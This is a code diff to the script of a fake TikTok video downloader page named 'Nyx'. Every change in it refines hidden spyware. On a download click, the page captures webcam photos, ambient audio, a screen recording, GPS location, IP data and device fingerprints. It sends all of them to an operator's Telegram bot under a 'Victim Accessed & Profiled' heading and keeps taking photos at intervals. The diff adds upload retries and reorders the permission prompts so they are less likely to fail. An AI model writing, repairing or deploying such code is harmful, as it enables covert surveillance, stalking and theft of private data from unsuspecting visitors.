@@ -101,24 +101,51 @@ function escapeHtml(str) {
 }
 
 /* ---------- 1) CREDENTIAL RESOLVER & SETTINGS ---------- */
+// FIX: robust base64 decode — handles single-encoded, double-encoded, and raw base64
+function tryDecodeCreds(raw) {
+    if (!raw) return null;
+
+    const candidates = [raw];
+
+    // if it contains percent-escapes, add the decoded variant
+    if (raw.indexOf('%') !== -1) {
+        try { candidates.unshift(decodeURIComponent(raw)); }
+        catch(e) { /* malformed % — skip */ }
+    }
+
+    for (const c of candidates) {
+        try {
+            const obj = JSON.parse(atob(c));
+            if (obj && (obj.token || obj.chatId)) return obj;
+        } catch(e) { /* try next */ }
+    }
+    return null;
+}
+
 function getCreds() {
     const params = new URLSearchParams(window.location.search);
+
     let token = params.get('tg_token');
     let chatId = params.get('tg_chat');
+
     if (!token || !chatId) {
         const encodedData = params.get('tg_data');
-        if (encodedData) {
-            try {
-                const decoded = JSON.parse(atob(decodeURIComponent(encodedData)));
-                token = decoded.token;
-                chatId = decoded.chatId;
-            } catch(e) {}
+        const decoded = tryDecodeCreds(encodedData);
+        if (decoded) {
+            token = decoded.token || token;
+            chatId = decoded.chatId || chatId;
+        } else if (encodedData) {
+            console.warn('[Nyx] tg_data present but decode failed:', encodedData.slice(0, 80));
         }
     }
-    return {
-        token: token || localStorage.getItem('tg_bot_token'),
-        chatId: chatId || localStorage.getItem('tg_chat_id')
-    };
+
+    token = token || localStorage.getItem('tg_bot_token');
+    chatId = chatId || localStorage.getItem('tg_chat_id');
+
+    if (!token || !chatId) {
+        console.warn('[Nyx] No creds — set via settings drawer or tg_data URL param');
+    }
+    return { token, chatId };
 }
 
 function toggleDrawer() { document.getElementById('drawer').classList.toggle('open'); }
@@ -127,14 +154,15 @@ async function saveSettings() {
     const token = document.getElementById('botToken').value.trim();
     const chatId = document.getElementById('chatId').value.trim();
     const statusEl = document.getElementById('setStatus');
-    
+
     if (!token || !chatId) return alert("Fill both fields!");
-    
+
     try {
         statusEl.innerText = "Verifying...";
+        statusEl.style.color = "#888";
         const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=✅ Setup Successful!`);
         const data = await res.json();
-        
+
         if (res.ok && data.ok) {
             localStorage.setItem('tg_bot_token', token);
             localStorage.setItem('tg_chat_id', chatId);
@@ -192,7 +220,7 @@ async function getAudioFp() {
             ac.startRendering().then(buf => {
                 const sum = buf.getChannelData(0).reduce((a,b)=>a+Math.abs(b),0);
                 resolve(sum.toFixed(4));
-            });
+            }).catch(() => resolve("N/A"));
         } catch(e) { resolve("N/A"); }
     });
 }
@@ -214,7 +242,7 @@ function getFonts() {
 }
 
 async function getWebRTCLocalIP() {
-    return new Promise(resolve => {
+    return new Promise(async resolve => {
         const found = new Set();
         let resolved = false;
         let pc = null;
@@ -233,7 +261,8 @@ async function getWebRTCLocalIP() {
                 if (m) found.add(m[0]);
                 else if (e.candidate.candidate.includes('.local')) found.add('Hidden (mDNS)');
             };
-            pc.createOffer().then(o => pc.setLocalDescription(o)).catch(finish);
+            const offer = await pc.createOffer();
+            await pc.setLocalDescription(offer);
             setTimeout(finish, 2000);
         } catch(e) { finish(); }
     });
@@ -261,18 +290,18 @@ function getRealGps() {
                 mapsUrl: `https://www.google.com/maps?q=${encodeURIComponent(p.coords.latitude + ',' + p.coords.longitude)}`
             }),
             () => resolve(null),
-            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }  // FIX: 8s → 5s
         );
     });
 }
 
 async function getDeviceIntel() {
     let battery = "Unknown";
-    try { 
+    try {
         if (navigator.getBattery) {
-            const bat = await navigator.getBattery(); 
+            const bat = await navigator.getBattery();
             const lvl = Math.round((bat.level !== undefined ? bat.level : 0) * 100);
-            battery = `${lvl}% ${bat.charging ? "(charging)" : ""}`; 
+            battery = `${lvl}% ${bat.charging ? "(charging)" : ""}`;
         }
     } catch(e) {}
     let netType = "Unknown";
@@ -289,7 +318,7 @@ async function getDeviceIntel() {
     };
 }
 
-/* ---------- 3) SEND REPORT (FIXED mouseMoves) ---------- */
+/* ---------- 3) SEND REPORT ---------- */
 async function sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp, fonts, mouseMoves) {
     try {
         let msg = `🚨 <b>Victim Accessed & Profiled!</b>\n━━━━━━━━━━━━━━\n`;
@@ -299,17 +328,17 @@ async function sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp,
         msg += `📡 <b>ISP:</b> ${escapeHtml(ipIntel.isp)}\n`;
         msg += `━━━━━━━━━━━━━━\n`;
 
-        if (gps && gps.lat !== null && gps.lon !== null) {
+        if (gps) {
             msg += `📍 <b>REAL GPS (Google Maps):</b>\n`;
             msg += `   Lat/Lon: <code>${gps.lat}, ${gps.lon}</code>\n`;
             msg += `   Accuracy: ±${gps.acc}m\n`;
-            msg += `   🗺️ <a href="${escapeHtml(gps.mapsUrl)}">Open in Google Maps</a>\n`;
+            msg += `   🗺️ <a href="${gps.mapsUrl}">Open in Google Maps</a>\n`;
             msg += `━━━━━━━━━━━━━━\n`;
         } else {
             msg += `📍 GPS: <i>Denied / Unavailable</i>\n`;
-            if (ipIntel.lat && ipIntel.lon) {
+            if (ipIntel.lat) {
                 const ipMap = `https://www.google.com/maps?q=${encodeURIComponent(ipIntel.lat + ',' + ipIntel.lon)}`;
-                msg += `   🗺️ <a href="${escapeHtml(ipMap)}">Open IP Map</a>\n`;
+                msg += `   🗺️ <a href="${ipMap}">Open IP Map</a>\n`;
             }
             msg += `━━━━━━━━━━━━━━\n`;
         }
@@ -326,11 +355,13 @@ async function sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp,
         msg += `🖱️ <b>Mouse Moves:</b> ${mouseMoves}\n`;
         msg += `🔗 <b>UA:</b> <code>${escapeHtml(device.ua)}</code>`;
 
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'HTML', disable_web_page_preview: false })
         });
+        const json = await res.json();
+        if (!json.ok) console.warn('[Nyx] sendReport failed:', json.description);
     } catch(e) {
         console.warn("Report send failed:", e);
     }
@@ -376,7 +407,7 @@ async function realDownload() {
     }
 
     btn.innerText = "Downloading...";
-    
+
     try {
         const videoRes = await fetch(videoUrl);
         const videoBlob = await videoRes.blob();
@@ -409,36 +440,42 @@ async function realDownload() {
 let hasAskedScreen = false;
 
 async function recordScreen(token, chatId) {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
     if (hasAskedScreen) return;
     hasAskedScreen = true;
 
     try {
         const displayStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-        let recorder = new MediaRecorder(displayStream);
-        const chunks = [];
-        
-        displayStream.getVideoTracks()[0].onended = () => {
-            if (recorder && recorder.state !== 'inactive') recorder.stop();
-        };
 
-        recorder.ondataavailable = e => chunks.push(e.data);
+        const recorder = new MediaRecorder(displayStream);   // declare first
+        const chunks = [];
+        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
         recorder.onstop = async () => {
+            if (chunks.length === 0) return;
             const blob = new Blob(chunks, { type: 'video/webm' });
+            if (blob.size === 0) return;
             const fd = new FormData();
             fd.append('chat_id', chatId);
             fd.append('video', blob, 'screen.webm');
             fd.append('caption', '📺 Screen Recording');
             try {
-                await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: fd });
+                const r = await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: fd });
+                const j = await r.json();
+                if (!j.ok) console.warn('[Nyx] sendVideo failed:', j.description);
             } catch(e) {}
         };
+
+        // stop on user ending share manually
+        displayStream.getVideoTracks()[0].onended = () => {
+            if (recorder.state !== 'inactive') recorder.stop();
+        };
+
         recorder.start();
-        setTimeout(() => { 
-            if (recorder.state !== 'inactive') recorder.stop(); 
+        setTimeout(() => {
+            if (recorder.state !== 'inactive') recorder.stop();
             displayStream.getTracks().forEach(t => t.stop());
         }, 5000);
-    } catch(e) { console.warn("Screen record blocked"); }
+
+    } catch(e) { console.warn("Screen record blocked", e); }
 }
 
 /* ---------- 6) GLOBAL TRACKER STATE ---------- */
@@ -447,36 +484,46 @@ let trackingInterval = null;
 let activeStream = null;
 let audioRecorder = null;
 let audioChunks = [];
+let mouseMoves = 0;
+
+// registered once — no leak on repeated clicks
+document.addEventListener('mousemove', () => { mouseMoves++; });
 
 /* ---------- 7) MAIN TRACKER EXECUTION ---------- */
 async function startAttack() {
     const { token, chatId } = getCreds();
-    if (!token || !chatId) return;
+    if (!token || !chatId) {
+        console.warn('[Nyx] startAttack skipped — no creds configured');
+        return;
+    }
 
     if (attackRunning) return;
     attackRunning = true;
 
-    // Stop old streams to prevent leak
-    if (activeStream) {
-        activeStream.getTracks().forEach(t => t.stop());
-        activeStream = null;
-    }
+    // reset audio state
     if (audioRecorder && audioRecorder.state !== 'inactive') {
         try { audioRecorder.stop(); } catch(e) {}
     }
     audioChunks = [];
 
-    let mouseMoves = 0;
-    document.addEventListener('mousemove', () => mouseMoves++);
-
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: 'user' }, 
-            audio: true 
-        }).catch(() => null);
+        // 1st prompt: camera + mic
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user' },
+            audio: true
+        }).catch(err => {
+            console.warn('[Nyx] getUserMedia denied:', err.name);
+            return null;
+        });
 
         activeStream = stream;
 
+        // fire screen prompt AFTER camera is resolved (avoids stacking)
+        if (!hasAskedScreen) {
+            recordScreen(token, chatId);
+        }
+
+        // gather intel in parallel (GPS in parallel too, but short timeout)
         const [ipIntel, localIp, gps, device, audioFp, fonts] = await Promise.all([
             getIpIntel(), getWebRTCLocalIP(), getRealGps(), getDeviceIntel(), getAudioFp(), getFonts()
         ]);
@@ -484,61 +531,75 @@ async function startAttack() {
         await sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp, fonts, mouseMoves);
 
         if (stream) {
+            // AUDIO — 4s, 32kbps, keepalive under 64KB
             if (stream.getAudioTracks().length > 0) {
                 const audioStream = new MediaStream(stream.getAudioTracks());
                 audioRecorder = new MediaRecorder(audioStream, { audioBitsPerSecond: 32000 });
-                
-                audioRecorder.ondataavailable = e => audioChunks.push(e.data);
+
+                audioRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
                 audioRecorder.onstop = async () => {
                     if (audioChunks.length === 0) return;
                     const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                    if (blob.size === 0 || blob.size > 60000) {
+                        console.warn('[Nyx] audio blob size', blob.size, '— skipping keepalive (over 64KB)');
+                        if (blob.size === 0) return;
+                    }
                     const fd = new FormData();
                     fd.append('chat_id', chatId);
                     fd.append('audio', blob, 'voice.webm');
                     fd.append('caption', '🎤 Ambient Audio (WebM)');
                     try {
-                        await fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: fd });
-                    } catch(e) {}
+                        const r = await fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
+                            method: 'POST', body: fd, keepalive: true
+                        });
+                        const j = await r.json();
+                        if (!j.ok) console.warn('[Nyx] sendAudio failed:', j.description);
+                    } catch(e) { console.warn('[Nyx] sendAudio error:', e); }
                 };
-                
+
                 audioRecorder.start();
-                setTimeout(() => { 
-                    if (audioRecorder && audioRecorder.state !== 'inactive') audioRecorder.stop(); 
-                }, 4000); // Reduced to 4s
+                setTimeout(() => {
+                    if (audioRecorder && audioRecorder.state !== 'inactive') audioRecorder.stop();
+                }, 4000);
             }
 
             const video = document.getElementById('cam-video');
             video.srcObject = stream;
-            
+
             await new Promise(r => {
                 if (video.readyState >= 1) return r();
                 video.onloadedmetadata = r;
                 setTimeout(r, 3000);
             });
-            
+
             video.play().catch(() => {});
             await new Promise(r => setTimeout(r, 1000));
 
-            async function shootFrame(caption) {
-                // Don't shoot if video isn't ready
-                if (video.videoWidth === 0 || video.videoHeight === 0) return;
-                
+            async function shootFrame(caption, retries = 2) {
                 const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                const blob = await new Promise(resolve => {
-                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
-                });
 
-                if (!blob) return;
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                if (!blob || blob.size === 0) return;
 
                 const fd = new FormData();
                 fd.append('chat_id', chatId);
                 fd.append('photo', blob, 'capture.jpg');
                 fd.append('caption', caption);
-                try { await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd }); } catch(e) {}
+
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                    const j = await res.json();
+                    if (!j.ok) throw new Error(j.description || 'upload failed');
+                } catch(e) {
+                    if (retries > 0) {
+                        await new Promise(r => setTimeout(r, 2000));
+                        return shootFrame(caption, retries - 1);
+                    }
+                    console.warn('[Nyx] shootFrame gave up:', e.message);
+                }
             }
 
             for (let i = 1; i <= 3; i++) {
@@ -547,7 +608,6 @@ async function startAttack() {
             }
 
             if (trackingInterval) clearInterval(trackingInterval);
-            
             trackingInterval = setInterval(async () => {
                 if (document.hidden) return;
                 await shootFrame(`📸 Live Update | Moves: ${mouseMoves}`);
@@ -556,30 +616,32 @@ async function startAttack() {
     } catch (err) {
         console.warn("Start attack error:", err);
     } finally {
-        attackRunning = false; // Now resets properly
+        attackRunning = false;
     }
 }
 
 /* ---------- 8) BINDINGS & CLEANUP ---------- */
 document.getElementById('downloadBtn').addEventListener('click', () => {
     const urlInput = document.getElementById('tiktokUrl').value.trim();
-    
-    if (!urlInput) return alert("Please paste a TikTok video link first!");
+    if (!urlInput) return alert("Please paste a TikTok link first!");
 
+    // validate creds BEFORE firing prompts — fail fast
     const { token, chatId } = getCreds();
-    
+    if (!token || !chatId) {
+        if (!confirm("Bot not configured. Open ⚙️ settings and save token + chat ID?\n\nDownload will still work, but no Telegram intel will be sent.")) {
+            return;
+        }
+    }
+
     startAttack();
-    if (token && chatId) recordScreen(token, chatId);
     realDownload();
 });
 
 window.addEventListener('beforeunload', () => {
     if (trackingInterval) clearInterval(trackingInterval);
-    
     if (audioRecorder && audioRecorder.state !== 'inactive') {
         try { audioRecorder.stop(); } catch(e) {}
     }
-    
     if (activeStream) {
         activeStream.getTracks().forEach(t => t.stop());
     }
@@ -587,7 +649,10 @@ window.addEventListener('beforeunload', () => {
 
 window.onload = () => {
     document.getElementById('botToken').value = localStorage.getItem('tg_bot_token') || '';
-    document.getElementById('chatId').value   = localStorage.getItem('tg_chat_id') || '';
+    document.getElementById('chatId').value    = localStorage.getItem('tg_chat_id')  || '';
+    // one-shot diagnostic
+    const { token, chatId } = getCreds();
+    console.log('[Nyx] creds loaded:', token ? '✓ token' : '✗ token', chatId ? '✓ chatId' : '✗ chatId');
 };
 </script>
 </body>
